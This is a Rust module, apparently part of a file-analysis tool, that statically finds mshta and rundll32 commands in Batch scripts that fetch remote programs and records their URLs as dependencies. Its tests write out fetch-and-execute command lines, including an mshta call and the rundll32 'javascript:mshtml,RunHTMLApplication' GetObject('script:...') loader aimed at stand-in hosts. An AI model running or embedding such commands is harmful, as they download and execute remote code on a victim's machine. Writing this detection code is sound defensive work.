//! Explicit remote-code targets in retained Batch command source facts.
//! No CMD expansion, JavaScript evaluation, COM activation or fetch runs here.
use super::{FetchCallDiscovery, UnresolvedFetchCall};
use filefacts::{RefKind, RefLocator, Reference};

fn tool(name: &str) -> String {
    name.rsplit(['/', '\\'])
        .next()
        .unwrap_or(name)
        .to_ascii_lowercase()
}
fn url(value: &str) -> bool {
    !value.contains(['%', '!', '^', '\\', '"', '\'', '\r', '\n'])
        && url::Url::parse(value)
            .is_ok_and(|u| matches!(u.scheme(), "http" | "https") && u.host_str().is_some())
}
fn quoted(input: &str) -> Option<(&str, &str)> {
    let input = input.strip_prefix('"')?;
    let end = input.find('"')?;
    Some((&input[..end], &input[end + 1..]))
}
fn first_argument(input: &str) -> Option<&str> {
    let input = input.trim_start();
    if input.starts_with('"') {
        return quoted(input).and_then(|(arg, tail)| {
            (tail.is_empty() || tail.starts_with(char::is_whitespace)).then_some(arg)
        });
    }
    input.split_whitespace().next()
}
fn moniker(input: &str) -> Option<&str> {
    let rest = input
        .strip_prefix("GetObject")?
        .trim_start()
        .strip_prefix('(')?
        .trim_start();
    let quote = rest.chars().next()?;
    if !matches!(quote, '\'' | '"') {
        return None;
    }
    let inside = &rest[1..];
    let end = inside.find(quote)?;
    let (literal, rest) = (&inside[..end], &inside[end + 1..]);
    if !matches!(rest.trim(), ")" | ");") {
        return None;
    }
    let (scheme, target) = literal.split_once(':')?;
    scheme.eq_ignore_ascii_case("script").then_some(target)
}
fn scriptlet(input: &str) -> Option<&str> {
    let input = input.trim_start();
    if !input.get(..11)?.eq_ignore_ascii_case("javascript:") {
        return None;
    }
    let (bridge, rest) = quoted(&input[11..])?;
    let bridge = bridge.to_ascii_lowercase();
    if bridge.contains(['%', '!', '^']) || !bridge.ends_with("mshtml,runhtmlapplication") {
        return None;
    }
    let prefix = &bridge[..bridge.len() - "mshtml,runhtmlapplication".len()];
    if !prefix.chars().all(|c| matches!(c, '\\' | '/' | '.')) {
        return None;
    }
    let rest = rest.trim_start().strip_prefix(';')?.trim_start();
    let rest = rest
        .strip_prefix("document.write();")
        .unwrap_or(rest)
        .trim_start();
    moniker(rest)
}

pub(super) fn discover(file_type: &str, values: &serde_json::Value) -> FetchCallDiscovery {
    let mut out = FetchCallDiscovery::default();
    if file_type != "batch" {
        return out;
    }
    let batch = values.pointer("/source/batch");
    if batch
        .and_then(|v| v.get("command_sites_truncated"))
        .and_then(serde_json::Value::as_bool)
        == Some(true)
    {
        out.unresolved.push(UnresolvedFetchCall {
            command: "batch-command-sites".into(),
            offset: None,
        });
    }
    let Some(sites) = batch
        .and_then(|v| v.get("command_sites"))
        .and_then(serde_json::Value::as_array)
    else {
        return out;
    };
    for site in sites.iter().take(128) {
        let (Some(name), Some(text), Some(offset), Some(name_offset), Some(name_end)) = (
            site["name"].as_str(),
            site["text"].as_str(),
            site["offset"].as_u64(),
            site["name_offset"].as_u64(),
            site["name_end"].as_u64(),
        ) else {
            continue;
        };
        let (Some(start), Some(end)) = (
            name_offset
                .checked_sub(offset)
                .and_then(|x| usize::try_from(x).ok()),
            name_end
                .checked_sub(offset)
                .and_then(|x| usize::try_from(x).ok()),
        ) else {
            continue;
        };
        if text.len() > 65_536
            || text.get(start..end) != Some(name)
            || !matches!(text.get(..start).map(str::trim), Some("" | "@"))
        {
            continue;
        }
        let Some(tail) = text.get(end..) else {
            continue;
        };
        let target = match tool(name).as_str() {
            "mshta" | "mshta.exe" => first_argument(tail),
            "rundll32" | "rundll32.exe" => scriptlet(tail),
            _ => continue,
        };
        if let Some(target) = target.filter(|target| url(target)) {
            let mut reference = Reference::new(
                RefLocator::Url(target.to_owned()),
                RefKind::Dependency,
                "ast-batch-program",
                text,
            );
            reference.offset = text
                .find(target)
                .and_then(|at| offset.checked_add(at as u64));
            out.references.push(reference);
        } else {
            let candidate = tail.trim_start();
            if candidate.contains(['%', '!', '^'])
                || candidate
                    .get(..11)
                    .is_some_and(|p| p.eq_ignore_ascii_case("javascript:"))
                    && candidate.contains("GetObject(")
            {
                out.unresolved.push(UnresolvedFetchCall {
                    command: tool(name),
                    offset: Some(offset),
                });
            }
        }
    }
    out
}

#[cfg(test)]
mod tests {
    use super::*;
    fn run(source: &str) -> FetchCallDiscovery {
        let parsed = filefacts::OpenOptions::new()
            .file_type(filefacts::FileType::Batch)
            .open(source.as_bytes());
        discover("batch", parsed.values().as_json())
    }
    #[test]
    fn remote_programs_have_literal_offsets_and_dependency_role() {
        for source in [
            "mshta https://program.test/stage.hta",
            "@MSHTA.EXE \"https://program.test/stage.hta\" argument\n",
            "rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication\";document.write();GetObject(\"script:https://program.test/stage.wsf\")",
        ] {
            let result = run(source);
            assert_eq!(result.references.len(), 1, "{source}");
            let r = &result.references[0];
            assert_eq!(r.kind, RefKind::Dependency);
            assert_eq!(r.offset, Some(source.find("https://").unwrap() as u64));
            assert!(result.unresolved.is_empty());
        }
    }
    #[test]
    fn printed_comments_data_and_other_dll_commands_are_not_program_fetches() {
        for source in [
            "rem mshta https://printed.test/a.hta\n",
            "echo mshta https://printed.test/a.hta\n",
            "echo rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication\";GetObject(\"script:https://printed.test/a.wsf\")\n",
            "rundll32.exe printui.dll,PrintUIEntry https://data.test/a.wsf\n",
            "mshta local.hta\n",
            "mshta /?\n",
        ] {
            assert!(run(source).references.is_empty(), "{source}");
        }
    }
    #[test]
    fn unknown_targets_are_gaps_without_argument_disclosure() {
        for source in [
            "mshta %PRIVATE_URL%\n",
            "rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication\";GetObject(secretValue)\n",
        ] {
            let result = run(source);
            assert!(result.references.is_empty());
            assert_eq!(result.unresolved.len(), 1);
            assert!(!format!("{result:?}").contains("PRIVATE_URL"));
        }
        let result = discover(
            "batch",
            &serde_json::json!({"source":{"batch":{"command_sites_truncated":true}}}),
        );
        assert_eq!(result.unresolved.len(), 1);
        assert!(
            discover(
                "json",
                &serde_json::json!({"source":{"batch":{"command_sites_truncated":true}}})
            )
            .unresolved
            .is_empty()
        );
    }
}
